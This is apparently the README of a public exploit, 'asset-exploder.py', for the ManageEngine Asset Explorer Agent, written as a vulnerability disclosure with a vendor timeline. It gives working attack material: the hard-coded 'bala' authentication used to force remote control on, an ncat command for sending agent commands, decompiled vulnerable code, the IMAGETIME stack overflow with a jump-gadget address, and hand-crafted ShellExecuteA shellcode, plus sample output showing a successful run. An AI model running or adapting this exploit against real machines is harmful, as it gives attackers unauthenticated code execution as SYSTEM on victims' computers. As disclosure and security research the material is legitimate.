# ManageEngine Asset Explorer Agent - Remote Code Execution as SYSTEM

So I'm annoyed with these guys, 6 months later and no fixes despite several product releases and updates, `aeagent.exe` has been changed, but it doesn't fix anything, the `ZohoMeeting.exe` hasn't been changed at all and has the same MD5 as before.

They have a Bug Bounty program, but only want to pay for XSS vulnerabilities, my name should be here: https://www.zoho.com/security/hall-of-fame.html - but I am no good with Burp and Firebug... maybe if I made this trigger XSS on one of their sites they'd do something about it.

## Usage

Ports 9000 and 10443 must be accessible on the target machine for the exploit to work. We provide an example shellcode which calls `ShellExecuteA` and then `exit()` and allows you to pass the command to execute as an argument to the script.

To launch Calculator on 192.168.203.100, use:

```
$ ./asset-exploder.py 192.168.203.100 shellcode/payload-ShellExecuteA.bin calc

 ▄▄▄        ██████   ██████  ██▓███   ██▓     ▒█████  ▓█████▄ ▓█████  ██▀███  
▒████▄    ▒██    ▒ ▒██    ▒ ▓██░  ██▒▓██▒    ▒██▒  ██▒▒██▀ ██▌▓█   ▀ ▓██ ▒ ██▒
▒██  ▀█▄  ░ ▓██▄   ░ ▓██▄   ▓██░ ██▓▒▒██░    ▒██░  ██▒░██   █▌▒███   ▓██ ░▄█ ▒
░██▄▄▄▄██   ▒   ██▒  ▒   ██▒▒██▄█▓▒ ▒▒██░    ▒██   ██░░▓█▄   ▌▒▓█  ▄ ▒██▀▀█▄  
 ▓█   ▓██▒▒██████▒▒▒██████▒▒▒██▒ ░  ░░██████▒░ ████▓▒░░▒████▓ ░▒████▒░██▓ ▒██▒
 ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░░ ▒░▓  ░░ ▒░▒░▒░  ▒▒▓  ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░
  ▒   ▒▒ ░░ ░▒  ░ ░░ ░▒  ░ ░░▒ ░     ░ ░ ▒  ░  ░ ▒ ▒░  ░ ▒  ▒  ░ ░  ░  ░▒ ░ ▒░
  ░   ▒   ░  ░  ░  ░  ░  ░  ░░         ░ ░   ░ ░ ░ ▒   ░ ░  ░    ░     ░░   ░ 
      ░  ░      ░        ░               ░  ░    ░ ░     ░       ░  ░   ░     
                                                       ░                      

[-] Connecting to 192.168.203.100 port 9000
[-] RemoteControl was running
[-] Enabling RemoteControl via aeagent.exe
[-] Enabled, waiting for RemoteControl connection
[+] Connected to RemoteControl
[+] Connection ready
[+] Send payload
[*] Success

$
```

## Technical Details

The Asset Explorer Agent accepts commands on port 9000, they are in the format of
`"prefixc#auth#cmd#arg\n"`, however it uses a hard-coded authentication string of `bala` meaning anybody can send commands to the agent and it will run them. The commands supported are:

 * NEWSCAN - Runs `aeagent.bat newscan`
 * SCAN - Runs `aeagent.bat scan`
 * DELTASCAN - Runs `aeagent.bat deltascan`
 * RDS - Forcibly start Remote Control without notifying user
 * RDS-PROMPT - Ask if the user wants to accept Remote Control
 * STOPRDS - Kills the `RemoteControl.exe` process / service
 * UPGRADE - Calls `agentcontroller.exe upgrade`
 * UNINSTALL - Calls `agentcontroller.exe uninstall`

Unfortunately we couldn't find an easy and straightforward way to exploit `aeagent.exe` directly to gain code execution, it only reads 100 bytes at a time, but it should be possible to spray the heap with crap and leave off the last `#`.

Commands can be invoked by hand with netcat, like:

```
echo 'PARAM1#bala#CMD#PARAM2#...' | ncat --ssl $TARGET-IP 9000
```

Which is parsed by the following code:

```c
        if ( j_ssl_read_sock(client_ssl_sock, cmd_buf, 100) > 0 )
          break;
        Log(".\\.\\main\\src\\AEAgent.cpp", 160, 3, "Unable to receive message size");
        if ( cmd_buf )
          free(cmd_buf);
        j_ssl_close_sock(client_ssl_sock);
      }
      cmd_cmd = 0;
      v16 = strtok(cmd_buf, "#");
      if ( v16 )
      {
        g_cmd_prefix = j_mbtowcs(v16);
        v17 = strtok(0, "#");
        if ( v17 )
        {
          g_cmd_auth = j_mbtowcs(v17);
          cmd_cmd = strtok(0, "#");
          if ( cmd_cmd )
          {
            cmd_str = strtok(0, "#");
            cmd_timeout = cmd_str;
            if ( cmd_str )
            {
              dword_493E60 = j_mbtowcs(cmd_str);
              v19 = strtok(0, "#");
              if ( v19 )
                g_cmd_who = j_mbtowcs(v19);
            }
            if ( !memcmp(cmd_cmd, "RDS-PROMPT", 11u) && cmd_timeout )
              timeout_ = atol_(cmd_timeout);
          }
        }
      }
      if ( !g_cmd_auth || wcscmp(g_cmd_auth, L"bala") )
      {
        Log(".\\.\\main\\src\\AEAgent.cpp", 443, 3, "Failed to authenticate");
        goto LABEL_113;
      }
```

Anyway, the most interesting functionality here is the `RDS` command, it launches `RemoteControl\ZohoMeeting.exe` as SYSTEM, which accepts connections on port 10443.

ZohoMeeting.exe is hilarious and full of stack overflows. The NX and DYNAMICBASE flags aren't set on the PE file so it runs at a static address and has an executable stack, *slowclap*, good job guys, this is 2016. We recommended that the least effort fix that Zoho should implement is simply re-building the executable with ASLR and NX enabled which would make this less trivial to exploit.

Once launched ZohoMeeting.exe will send the contents of the clipboard over the socket and other such fun things, you could use the variety of built-in commands to own the machine, but the easiest way we found was to overflow the `IMAGETIME` command:

```c
// cmdbuf = "IMAGETIME X Y"
char __stdcall cmd_IMAGETIME(const char *cmdbuf)
{
  char *copiedstr; // ebx@1
  char str2[20]; // [sp+Ch] [bp-28h]@1
  char str1[20]; // [sp+20h] [bp-14h]@1

  copiedstr = (char *)calloc(1u, strlen(cmdbuf) + 1); // arbitrary sized buffer
  strcpy(copiedstr, cmdbuf);                          // cannot contain nulls
  MemoryMoveLeft(copiedstr, strlen("IMAGETIME "));    // remove cmd prefix
  sscanf(copiedstr, "%s %s", str1, str2);             // into 2x 20 byte fields
  free(copiedstr);                                    
  sub_448B20();
  return sub_447810(str1, str2);
}
```

First we fill up `str1` with stuff and overwrite the return address with `0x0048048d: jmp ecx`, where `ecx` is the address of `str2`. In `str2` we execute some code which jumps to the position of our arbitrarily sized block of shellcode appended to the end of the string (but not parsed by sscanf).

For all the shell & ROP code we need to avoid null bytes and newlines, so we hand crafted some to call a wrapper for `ShellExecuteA` and then `exit`, using data appended to the shellcode as the command to execute.

```asm
BITS 32

; This function calls ShellExecuteA
; ebx will be 430920h
xor ebx, ebx
add ebx, 0x43
shl ebx, 8
add ebx, 0x09
shl ebx, 8
add ebx, 0x20

; Then call ShellExecuteA("...")
; Shellcode address is EAX
; Command string appended to end
add eax, 0x2A
push eax
call ebx

; Then call 40143Bh:
; 	push 0
; 	call ds:exit
;
xor ebx, ebx
add ebx, 0x40
shl ebx, 8
add ebx, 0x14
shl ebx, 8
add ebx, 0x3B
call ebx

```

## Timeline

 * 19 May 2016 - Initial contact with Zoho Security
 * 19 May - Informed them of hard-coded auth, self-signed CA & PK and RCE.
 * 20 May - Zoho setup PGP encrypted e-mail, PoC sent
 * 23 May - 'We are currently working with the appropriate team'...
 * 13 June - Any update?
 * 14 June - Working to get an issue fixed
 * 28 June - Notify them of deadline and release
 * 30 June - Hellooo?
 * 11 July - 'Our team has started working to get this fixed', 'If its crossing the grace period, please proceed from your side.'
 * 08 August - Any update?
